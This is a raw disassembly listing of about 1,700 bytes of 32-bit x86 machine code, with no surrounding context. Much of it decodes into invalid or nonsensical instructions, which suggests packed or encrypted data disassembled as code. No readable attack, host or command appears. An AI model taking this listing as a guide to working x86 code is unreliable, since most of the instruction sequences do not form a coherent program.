  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
